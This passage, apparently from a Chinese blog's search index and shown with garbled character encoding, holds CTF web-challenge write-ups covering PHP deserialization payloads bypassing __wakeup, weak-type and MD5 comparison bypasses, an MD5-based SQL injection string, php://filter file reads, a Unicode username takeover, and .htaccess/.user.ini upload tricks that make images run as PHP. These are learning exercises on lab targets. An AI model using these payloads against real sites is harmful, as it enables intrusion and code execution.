(1)åˆ©ç”¨CL-CL\n\n![image-20220113150704935](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131507999.png)\n\n```\nContent-Length: 0\nContent-Length: 0\n```\n\n#### (2)åˆ©ç”¨CL-TE\n\n![image-20220113151848304](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131518370.png)\n\n```\nTransfer-Encoding: chunked\nContent-Length: 3\n```\n\næœ‰æ—¶å€™åˆå¾ˆå¥‡æ€ªï¼Œå°±ç¦»è°±ã€‚\n\nåŒæ—¶GETæ”¹æˆPOSTä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\n\nåé¢éƒ½ä¸€æ ·äº†ï¼Œå°±æ˜¯ç»•è¿‡åç«¯çš„è¿‡æ»¤ã€‚\n\n\n\n[4.17. HTTP è¯·æ±‚èµ°ç§ â€” Webå®‰å…¨å­¦ä¹ ç¬”è®° 1.0 æ–‡æ¡£ (websec.readthedocs.io)](https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html)\n\n\n\n# åå…­ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP\n\n## ğŸ”ºPHPååºåˆ—åŒ–\n\n## 1.åˆ†æ\n\n`dirsearch`æ‰«æå‘ç°`www.zip`ï¼Œè¯¥æ–‡ä»¶ä¸ºç½‘å€å¤‡ä»½æ–‡ä»¶ï¼Œå¯ä»¥ä¸‹è½½ä¸‹æ¥ï¼Œå…¶ä¸­ä¸º\n\n![image-20220710161845497](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161845497.png)\n\nä¹‹åçœ‹`index.php`ä¸­æœ‰å¦‚ä¸‹ä»£ç \n\n![image-20220710161859892](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161859892.png)\n\nå†è½¬åˆ°`class.php`\n\n```php\n<?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n        }\n    }\n}\n?>\n```\n\nåœ¨`__destruct`å‡½æ•°ä¸­ï¼Œå½“ä¼ å…¥çš„ç”¨æˆ·åä¸º`admin`ä¼šè¾“å‡º`flag`ï¼Œä½†æ˜¯åœ¨`__wakeup`å‡½æ•°ä¸­ï¼Œç”¨æˆ·åè¢«èµ‹å€¼ä¸º`guest`ã€‚æˆ‘ä»¬çŸ¥é“`__wakeup`æ˜¯åœ¨ååºåˆ—åŒ–çš„æœ€å¼€å§‹è°ƒç”¨çš„ï¼Œéœ€è¦å»æ‰¾ä¸ªç»•è¿‡æ–¹æ³•ã€‚\n\n## 2.ç»•è¿‡`__wakeup`\n\nåˆ©ç”¨`CVE-2016-7124`ï¼Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶\n\n```\nPHP5 < 5.6.25\nPHP7 < 7.0.10\n```\n\nåœ¨ååºåˆ—åŒ–æ—¶ï¼Œæˆå‘˜ä¸ªæ•°çš„å€¼å¤§äºå®é™…æˆå‘˜ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡`__wakeup`å‡½æ•°çš„æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ä½¿å¾—ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æˆå‘˜ä¸ªæ•°å¤§äºå®é™…çš„æˆå‘˜ä¸ªæ•°ã€‚å¦‚ä¸‹ï¼Œå°†`Name`è¿™ä¸ªå¯¹è±¡å¯¹åº”çš„æˆå‘˜ä¸ªæ•°ç”±åŸæœ¬çš„2æ”¹ä¸º3å³å¯ç»•è¿‡ã€‚\n\n```\nO:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\nO:4:\"Name\":3:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\n```\n\nå‚è€ƒï¼š[PHP å†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´ (seebug.org)](https://paper.seebug.org/866/#php_2)\n\n### å°æŠ€å·§\n\nå¯¹äºå®é™…æ·»åŠ æˆå‘˜çš„å±æ€§ä¹Ÿèƒ½ä»ä¸€ç§ç¨‹åº¦ä¸Šç»•è¿‡`__wakeup`ï¼Œå¦‚ä¸‹æ‰€ç¤º\n\n```php\n<?php\nclass A{\n    function __toString(){\n        print_r(\"calling __toString\\n\");\n        return \"\";\n    }\n    function __wakeup(){\n        print_r(\"calling __wakeup\\n\");\n    }\n}\n\nclass B{\n    public $a;\n    function __destruct(){\n        echo $this->a;\n    }\n}\n$b = new B();\n$b->a = new A();\n$myStr = serialize($b);\nprint_r($myStr);\n\n//$objStr = 'O:1:\"B\":1:{s:1:\"a\";O:1:\"A\":0:{}s:1:\"n\":N;}';\n//$originStr = 'O:1:\"B\":1:{s:1:\"a\";O:1:\"A\":0:{}}';\n//unserialize($objStr);\n//echo \"aa\";\n?>\n```\n\nå…ˆç”Ÿæˆä¸€ä¸‹åºåˆ—åŒ–é“¾å­ï¼Œå¾—åˆ°`$originStr`\n\n```\n$originStr = 'O:1:\"B\":1:{s:1:\"a\";O:1:\"A\":0:{}}';\n//æ·»åŠ ä¸€ä¸ªå±æ€§ `s:1:\"n\":N;`å¾—åˆ°å¦‚ä¸‹$objStr\n$objStr = 'O:1:\"B\":1:{s:1:\"a\";O:1:\"A\":0:{}s:1:\"n\":N;}';\n```\n\nä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œå‘ç°å…ˆ`__toString`ï¼Œå†è°ƒç”¨`__wakeup`\n\n```\nunserialize($objStr);\n```\n\nè¿™æ ·ä¹Ÿä»£è¡¨ä»å¦ä¸€ç§æ–¹å¼ç»•è¿‡`__wakeup`å‡½æ•°äº†ã€‚\n\næ­¤å¤–æ›¿æ¢`s:1:\"n\":N;`ä¸º`;`å…¶å®ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåœ¨`php8`ç‰ˆæœ¬ä¸‹ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æŸä¸ª`CVE`ï¼Œ\n\n\n\n## 3.privateæˆå‘˜\n\nåºåˆ—åŒ–æ—¶\n\n```php\n<?php\n\nclass Name{\n    public $username = 'nonono';\n    private $password = 'yesyes';\n    protected $cookie = 'cookie';\n\n    public function __construct($username,$password,$cookie){\n        $this->username = $username;\n        $this->password = $password;\n        $this->cookie = $cookie;\n    }\n}\n$a = new Name('admin', 100,\"cookie\");\n$b = serialize($a);\necho \"aaa\";\n\n?>\n```\n\nä¸åŒç±»å‹çš„æˆå‘˜åºåˆ—åŒ–ä¹‹åæˆå‘˜å˜é‡åä¿å­˜çš„å½¢å¼ä¸å¤ªä¸€æ ·\n\n- private\n\n  å˜ä¸º`\\x00$password\\00`\n\n- public\n\n  ä»ç„¶ä¸ºåŸå§‹çš„ï¼Œå³`username`\n\n- protected\n\n  å˜ä¸º`\\00*\\00cookie`\n\næ‰€ä»¥åœ¨ä¼ å…¥ååºåˆ—å­—ç¬¦ä¸²æ—¶ï¼Œéœ€è¦è€ƒè™‘åˆ°è¿™äº›ç‰¹ç‚¹ï¼Œè¿™é‡Œå¯¹åº”`private`æˆå‘˜å°±éœ€è¦ä¼ å…¥`URL`ç¼–ç çš„`\\x00`å³`%00`\n\n## 4.æœ€ç»ˆpayload\n\nä¿®æ”¹æˆå‘˜æ•°é‡ç»•è¿‡`__wakeup`ï¼ŒåŠ å…¥`%00`è¡¨ç¤º`private`æˆå‘˜\n\n```\nselect=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n\n# åä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile\n\n## ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½\n\né¦–å…ˆè·å–å¤‡ä»½æºç `url/index.php.bak`ï¼Œæ‰«ä¸€ä¸‹ä¹Ÿå¯ä»¥\n\n```php\n<?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) {\n    $key = $_GET['key'];\n    if(!is_numeric($key)) {\n        exit(\"Just num!\");\n    }\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) {\n        echo $flag;\n    }\n}\nelse {\n    echo \"Try to find out source file!\";\n}\n\n```\n\nçœ‹åˆ°å½“ä¼ å…¥çš„`key`ç­‰äº`str`æ—¶ä¼šæ‰“å°`flag`ï¼Œä½†æ˜¯åˆä¸èƒ½ä¼ å­—ç¬¦ï¼Œè¿™é‡Œå°±ç”¨åˆ°å¼±ç±»å‹æ¯”è¾ƒ\n\n```php\n<?php\n$key = 123;\n$abc = \"123aaaa\";\nif($key == $abc){\n    echo \"bbbb\";\n}\n?>\n```\n\nä¸Šè¿°ä»£ç ä¼šè¾“å‡º`bbbb`ï¼ŒåŸå› å°±æ˜¯å½“`==`æ¯”è¾ƒå¯¹è±¡ä¸­ä»»æ„ä¸€ä¸ªä¸ºæ•°å­—ï¼Œå°±ä¼šæŠŠå¦ä¸€ä¸ªæ¯”è¾ƒå¯¹è±¡ä¹Ÿå¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—ï¼Œå¯¹äºå­—ç¬¦ä¸²å‹çš„å¼ºåˆ¶è½¬æ¢ï¼Œä¼šä»å·¦å¼€å§‹éå†ï¼Œç›´åˆ°ç¢°åˆ°éæ•°å­—çš„éƒ¨åˆ†ï¼Œä¸¢å¼ƒä¹‹åçš„éƒ¨åˆ†ï¼Œè½¬æ¢ä¸ºæ•°å­—ï¼Œæ‰€ä»¥æ¡ä»¶æˆç«‹ã€‚\n\n```php\n$abc = \"123aaaa333\";\necho intval($abc);\n```\n\nä¸Šè¿°ä»£ç ä¼šè¾“å‡º`123`ï¼Œ\n\né‚£ä¹ˆä¼ å…¥`key=123`å³å¯ã€‚\n\n# åå…«ã€[HCTF 2018]admin\n\n## ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€\n\n[ä¸€é¢˜ä¸‰è§£ä¹‹2018HCTF&admin - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/164086#h3-6)\n\næç¤º`admin`ï¼Œæœ‰ç™»å½•æ³¨å†Œç•Œé¢ï¼Œæ³¨å†Œç•Œé¢æ³¨å†Œ`admin`å¤±è´¥ï¼Œåº”è¯¥æœ‰è¯¥ç”¨æˆ·ã€‚é‚£ä¹ˆç›´æ¥å°è¯•`Burpsuite`å¼±å¯†ç çˆ†ç ´ã€‚BUUå¹³å°å‘åŒ…éœ€è¦æ…¢ä¸€ç‚¹\n\n![image-20220711121051309](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220711121051309.png)\n\nçˆ†å‡ºæ¥123ï¼Œç™»å½•å¾—`flag`ã€‚è¿™ä¸ç®—ä»€ä¹ˆè§£æ³•ï¼Œå°±è®°å½•ä¸€ä¸‹ã€‚\n\n## 1.è§£æ³•ä¸€\n\n`python`çš„`flask`æ¨¡æ¿åº“`Twisted`ä¸­çš„å‡½æ•°é—®é¢˜\n\nåœ¨ä¿®æ”¹å¯†ç çš„é¡µé¢æºä»£ç æœ‰æç¤ºï¼Œè¯¥ç½‘ç«™ä½¿ç”¨çš„ä¸º`python`çš„`flash`æ¨¡æ¿ï¼Œç»™äº†ç›¸å…³ç½‘å€ï¼š[woadsl1234/hctf_flask: hctf_flask (github.com)](https://github.com/woadsl1234/hctf_flask)ï¼Œå…¶ä¸­çš„å„ä¸ªåŒ…ç‰ˆæœ¬\n\n![image-20220712144242517](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220712144242517.png)\n\n- æŸ¥æ‰¾`flask`çš„è·¯ç”±`routes.py`ï¼Œæ³¨å†Œã€ç™»å½•ã€ä¿®æ”¹å¯†ç çš„ç›¸å…³å‡½æ•°ï¼Œä½¿ç”¨çš„éƒ½æ˜¯`strlower`å‡½æ•°\n\n  ```python\n  def strlower(username):\n      username = nodeprep.prepare(username)\n      return username\n  ```\n\n  æ¥å°†ç”¨æˆ·åè¿›è¡Œå°å†™åŒ–ï¼Œè€Œ`nodeprep`ä½äºåŒ…`Twisted==10.2.0`\n\n- ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„åŒ…ï¼Œè·Ÿè¿›æŸ¥çœ‹å‡½æ•°\n\n  ```python\n  nodeprep = Profile(mappings=[B_1, B_2],\n                     prohibiteds=[C_11, C_12, C_21, C_22,\n                                  C_3, C_4, C_5, C_6, C_7, C_8, C_9,\n                                  LookupTable([u'\"', u'&', u\"'\", u'/',\n                                               u':', u'<', u'>', u'@'])])\n  ```\n\n  ä½¿ç”¨ç›¸å…³çš„`unicode`ç¼–ç ï¼Œç›¸å…³ç¼–ç å¯æŸ¥ï¼š\n\n  [Unicode - Unicode Character Table (unicode-table.com)](https://unicode-table.com/en/blocks/)\n\n  åˆ¶å®šäº†ç›¸å…³è¡¨æ ¼ç´¢å¼•ï¼Œä¸çŸ¥é“æ˜¯æ€ä¹ˆåˆ¶å®šçš„ï¼Œåº”è¯¥æ˜¯å­—å…¸å•¥çš„æŠŠï¼Œæ¯”å¦‚ç»è¿‡`nodeprep.prepare`ä¹‹å\n\n  ```\n  u'\\u0041'  ---->   u'\\u0061'\n  A          ---->   a\n  ```\n\n  ä¸è¿‡åœ¨è¯¥é¢˜çš„ç‰ˆæœ¬ä¸‹ï¼Œä¹Ÿå°±æ˜¯`Twisted==10.2.0`ï¼Œå…¶å†…éƒ¨ä»£ç å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œå¯¼è‡´\n\n  ```\n  u'\\u1d2c'  ---->   u'\\u0041'\n  á´¬          ---->   A\n  ```\n\n  è¿™æ ·å°±æœ‰ç‚¹é—®é¢˜ï¼Œå¯¼è‡´å¦‚ä¸‹æƒ…å†µ\n\n  ```\n  strlower('á´¬')=A\n  strlower('A')=a\n  ```\n\n  ä¸è¿‡ç°åœ¨æœ€æ–°ç‰ˆæœ¬çš„`Twisted`å·²ç»æ²¡äº†è¿™ä¸ªé—®é¢˜ã€‚\n\n- ä¾æ®è¿™æ ·ï¼Œæ³¨å†Œçš„æ—¶å€™ä½¿ç”¨`á´¬dmin`ï¼Œå˜æˆäº†ç”¨æˆ·`Admin`ã€‚ç„¶åç™»å½•`Admin`ï¼Œä¿®æ”¹å¯†ç ï¼Œå˜æˆäº†ä¿®æ”¹`admin`çš„å¯†ç ï¼Œå³å¯å¾—åˆ°`admin`è´¦æˆ·ã€‚\n\n## 2.è§£æ³•äºŒ\n\nåˆ©ç”¨`flask`æ¨¡æ¿å­˜åœ¨äºå®¢æˆ·ç«¯çš„ç¼ºé™·ï¼Œä¼ªé€ `session`ï¼Œç‰ˆæœ¬å®‰è£…è€å¤±è´¥ï¼Œæ”¾å¼ƒ\n\n## 3.è§£æ³•ä¸‰\n\næ¡ä»¶ç«äº‰ï¼Œå°±æ˜¯åœ¨æ”¹å¯†ç çš„æ—¶å€™ä¸­æ–­ï¼Œç„¶ååˆ©ç”¨ç™»å½•åŠŸèƒ½ï¼Œå°è¯•ç™»å½•`admin`ï¼Œå°†å½“å‰çš„`session['name']`æ”¹ä¸º`admin`ï¼Œä¹‹åå†å›åˆ°æ”¹å¯†ç çš„åœ°æ–¹ï¼Œå°†`admin`çš„å¯†ç æ”¹æ‰ã€‚\n\n![image-20220713111008888](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220713111008888.png)\n\næŒ‰ç†è¯´å†ç™»å½•çš„æ—¶å€™ï¼Œåº”è¯¥å…ˆæŸ¥æœ‰æ²¡æœ‰è¯¥ç”¨æˆ·çš„ï¼Œç™»å½•ä¹‹åå†è¿›è¡Œ`session['name']`çš„èµ‹å€¼è¿™é‡Œå°±æ˜¯åˆ©ç”¨äº†å…ˆèµ‹å€¼`session['name']`çš„æ¼æ´ã€‚\n\n# åä¹ã€[BJDCTF2020]Easy MD5\n\n[[BUUOJè®°å½•\\] [BJDCTF2020]Easy MD5 - Ye'sBlog - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/yesec/p/12535534.html)\n\n## ğŸ”ºMD5+SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡\n\n## 1.MD5å®ç°SQLæ³¨å…¥\n\nç¬¬ä¸€å…³çš„çš„`http`å¤´éƒ¨æœ‰`hint`\n\n```sql\nselect * from 'admin' where password=md5($pass,true)\n```\n\nå‚æ•°ä¸º`true`ä»£è¡¨è¿”å›åŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äº`SQL`è¯­å¥è¢«`md5`ä¹‹åçš„å­—ç¬¦ç›´æ¥æ§åˆ¶ï¼Œé‚£ä¹ˆå°è¯•æ„é€ å¦‚ä¸‹\n\n```sql\nselect * from 'admin' where password=''or'xxx' \n```\n\nè¿™æ ·å°±èƒ½ç»•è¿‡äº†ã€‚\n\nä¹Ÿå°±æ˜¯æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²`str`ï¼Œå…¶`md5(str)='or'xxx `ï¼Œè€Œ`'or' `å¯¹åº”çš„16è¿›åˆ¶ä¸º`0x276f7227`ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²`ffifdyop`çš„`md5`å°±æ»¡è¶³è¿™ä¸ªæ¡ä»¶(ä¸çŸ¥é“è¿™ä¹ˆæ¥çš„)ã€‚\n\nPSï¼šé‚£å¦‚æœä»¥åæƒ³æ‰¾ä¸ä¸€æ ·çš„çš„ï¼Œæ˜¯å¦éœ€è¦ç”¨åˆ°`md5`ç¢°æ’ï¼Ÿ\n\n## 2.PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ\n\næŸ¥çœ‹æºç ï¼Œæ³¨é‡Šéƒ¨åˆ†æœ‰æç¤º\n\n```php\n$a = $GET['a'];\n$b = $_GET['b'];\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\nè¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ï¼Œæ‰¾ä¸€ä¸‹`0exx`è¿™ä¸ªç§‘å­¦è®¡æ•°æ³•ï¼Œä»£è¡¨0çš„xxæ¬¡æ–¹ï¼Œè¿˜æ˜¯0ã€‚`QNKCDZO`å’Œ`s214587387a`\n\n## 3.æ•°ç»„ç»•è¿‡\n\næœ‰æºç \n\n```php\n <?php\nerror_reporting(0);\ninclude \"flag.php\";\n\nhighlight_file(__FILE__);\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n} \n```\n\nåˆ©ç”¨`PHP`çš„`md5`è®¡ç®—ç‰¹æ€§\n\n```\nmd5(array()) = null\nsha1(array()) = null    \nereg(pattern,array()) = null vs preg_match(pattern,array) = false\nstrcmp(array(), \"abc\") = null\nstrpos(array(),\"abc\") = null\n```\n\n`POST`ä¼ å…¥`param1[]=1&param2[]=2`å³å¯å¾—åˆ°Flag\n\n# äºŒåã€[ZJCTF 2019]NiZhuanSiWei\n\n## ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–\n\nç»™äº†æºç \n\n```php\n<?php  \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"welcome to the zjctf\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        echo \"Not now!\";\n        exit(); \n    }else{\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\néœ€è¦è®¾ç½®`text`ï¼Œä½†æ˜¯ç”¨çš„æ˜¯`file_get_contents`ï¼Œè¿™ä¸ªéœ€è¦ä¸ºæ–‡ä»¶æµï¼Œå¯ä»¥ä½¿ç”¨`data`ä¼ªåè®®ã€‚\n\n```\ntext=data://text/plain,welcome%20to%20the%20zjctf\n```\n\nç„¶å`file`æç¤ºåŒ…å«è¿›`useless.php`ï¼Œä½¿ç”¨`php://filter/`ä¼ªåè®®è¿›è¡Œè¯»å–\n\n```\nfile=php://filter/read=convert.base64-encode/resource=useless.php\n```\n\n`base64`è§£ç åè·å–åˆ°æºç \n\n```php\n<?php \n \nclass Flag{  //flag.php \n    public $file; \n    public function __tostring(){ \n        if(isset($this->file)){ \n            echo file_get_contents($this->file);\n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        } \n    } \n} \n?> \n```\n\nå¯ä»¥çœ‹åˆ°ä¼šè¾“å‡º`file`æˆå‘˜æŒ‡å‘çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆä¿®æ”¹`file`ä¸º`flag.php`ï¼Œè¿›è¡Œåºåˆ—åŒ–ï¼Œå¾—åˆ°\n\n```\nO:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\nç»“åˆæ‰€æœ‰çš„ï¼Œæœ€åååºåˆ—åŒ–`password`å¾—åˆ°æœ€ç»ˆçš„`payload`\n\n```\ntext=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\nåœ¨æºç æ³¨é‡Šä¸­çœ‹åˆ°`flag`\n\n# äºŒåä¸€ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢\n\n## ğŸ”º`.htaccess`åˆ©ç”¨\n\nä¼ å…¥`.htaccess`å¦‚ä¸‹\n\n```\n<FilesMatch \"test.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\nä½¿å¾—`php`å¯ä»¥è§£æ`test.png`ä¸º`php`ï¼Œä»è€Œæ‰§è¡Œã€‚ä¸è¿‡`.htaccess`åªèƒ½åœ¨`apache`æœåŠ¡ä¸­èµ·ä½œç”¨\n\n# äºŒåäºŒã€[SUCTF 2019]CheckIn\n\n## ğŸ”º`.user.ini`åˆ©ç”¨\n\nä¼ å…¥`.user.ini`å¦‚ä¸‹\n\n```\nGIF89a\nauto_prepend_file=origin.png\n```\n\nå‚è€ƒ[æµ…æ.htaccesså’Œ.user.iniæ–‡ä»¶ä¸Šä¼  - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·](https://www.freebuf.com/articles/web/287193.html)\n\n`auto_prepend_file`è¡¨ç¤º`.user.ini`å­˜åœ¨çš„å½“å‰ç›®å½•ä¸‹æ‰§è¡Œ`php`ä»£ç ä¹‹å‰ï¼Œé¢„å…ˆæ–‡ä»¶åŒ…å«è¿›`origin.png`ï¼Œä»è€Œèƒ½å¤Ÿè¿›è¡Œä½œä¸º`php`ä»£ç è§£æ\n\n# äºŒåä¸‰ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz\n\n## ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ\n\næ‰“å¼€å¾—åˆ°æºç \n\n```php\n<?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n\n}\n\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n\n}\n```\n\nå¯ä»¥çœ‹åˆ°æ¡ä»¶å¦‚ä¸‹ï¼š\n\n- `GET`ä¼ å…¥çš„`str`ä¸­æ¯ä¸€ä¸ªå­—ç¬¦éƒ½éœ€è¦åœ¨`%32~%125`ï¼Œå±äºå¯è§å­—ç¬¦ä¸­\n- å½“`op`ä¸º`\"2\"`æ˜¯ï¼Œæ‰“å°å‡º`filename`\n- `filename`éœ€è¦ä¸º`flag.php`\n\n## æ¡ä»¶ä¸€\n\nè¿™ä¸ªä½¿ç”¨`php7.1+`é’ˆå¯¹æˆå‘˜å±æ€§ä¸æ•æ„Ÿçš„ç‰¹æ€§ï¼Œå³åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å…¶æ­£å¸¸çš„`protected`æˆå‘˜ä¼šæœ‰`\\00*\\00`æ¥ä¿®é¥°ï¼Œä½†æ˜¯è¿™é‡Œä¸å…è®¸ä¼ å…¥`\\00`ï¼Œé‚£å°±ä¸ä¼ å…¥ã€‚è¿™ä¸ª`php7.1+`çš„ç‰¹æ€§å…è®¸åœ¨æ²¡æœ‰ä¿®é¥°çš„æ—¶å€™ï¼Œä¹Ÿèƒ½è¿›è¡Œè½¬æ¢ï¼Œä¸ç®¡æ˜¯`private`è¿˜æ˜¯`protected`ã€‚ä½†æ˜¯`php7.1`ä»¥ä¸‹åˆ™ä¸è¡Œï¼Œä¼šå°†ç›¸å…³çš„å˜é‡ç½®ä¸º`null`ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œä»è€Œæ— æ³•åˆ©ç”¨ã€‚\n\nè‡³äºåé¢çš„å¤šå‡ºæ¥çš„å±æ€§æ˜¯æ€ä¹ˆå›äº‹ï¼Œå°±ä¸å¤ªçŸ¥é“äº†ï¼Œä¼°è®¡æ˜¯`php`åº•å±‚ä»£ç é—®é¢˜\n\n![image-20220726173826850](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220726173826850.png)\n\n## æ¡ä»¶äºŒ\n\nå¯ä»¥æ³¨æ„åˆ°ç¬¬ä¸€æ¬¡åœ¨`__destruct`ä¸­æ¯”è¾ƒ`op`ç”¨çš„æ˜¯å¼ºæ¯”è¾ƒ`===`\n\n```php\nif($this->op === \"2\")\n    $this->op = \"1\";\n```\n\nè€Œç¬¬äºŒæ¬¡åœ¨`process`å‡½æ•°ä¸­ç”¨çš„æ˜¯å¼±æ¯”è¾ƒ`==`\n\n```php\nif($this->op == \"1\") {\n    $this->write();\n} else if($this->op == \"2\") {\n    $res = $this->read();\n    $this->output($res);\n} \n```\n\né‚£ä¹ˆå°±å¯ä»¥ä½¿å¾—`op`ä¸º`int`å‹çš„`2`ï¼Œè¿™æ ·å³å¯å¦‚ä¸‹ç»“æœ\n\n```\nif($this->op === \"2\") \t\tä¸ºFalse\nif($this->op == \"1\")\t\tä¸ºFalse\nelse if($this->op == \"2\")\tä¸ºTrue\n```\n\né‚£ä¹ˆå³å¯é¡ºåˆ©è·³åˆ°æ‰“å°`filename`çš„åœ°æ–¹\n\næ¡ä»¶ä¸‰å°±ä¸ç”¨è¯´äº†ï¼Œå¯¹åº”èµ‹å€¼å³å¯ï¼Œæœ€ç»ˆ`payload`\n\n```\n?str=O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;}\n```\n\n`flag`åœ¨æ³¨é‡Šé‡Œã€‚\n\n","tags":["é™ªXXçš„WebBUUåˆ·é¢˜"],"categories":["é™ªXXçš„WebBUUåˆ·é¢˜"]},{"url":"/2021/12/29/WebæŠ€æœ¯ä¸åº”ç”¨/","content":"WebæŠ€æœ¯ä¸åº”ç”¨\n\n\n\n# ä¸€ã€Java Script:\n\n## 1.å¼•å…¥scriptä»£ç ï¼š\n\n```html\n<script>\n\t<!---javascript ä»£ç --->\n</script>\n```\n\n\n\n## 2.å¼•å…¥å¤–éƒ¨scriptä»£ç \n\n```html\n<script src = \"externalJS.js\">\n</script>\n```\n\n\n\n## 3.å®šä¹‰å˜é‡ï¼š\n\n### (1)èµ‹å€¼å®šä¹‰ï¼š\n\n```javascript\nvar i = 123;\nvar str = \"Hello\";\nvar str1 = 'abc';\nvar phr = \\`abc\\${str}`;//(ä½¿ç”¨è¿™ç§ç±»å‹æ’å…¥å…¶ä»–çš„å­—ç¬¦)\n```\n\n\n\n### (2)æœªèµ‹å€¼ï¼Œåˆå§‹åŒ–ç±»å‹\n\n```js\nvar i;\ntypeof i = 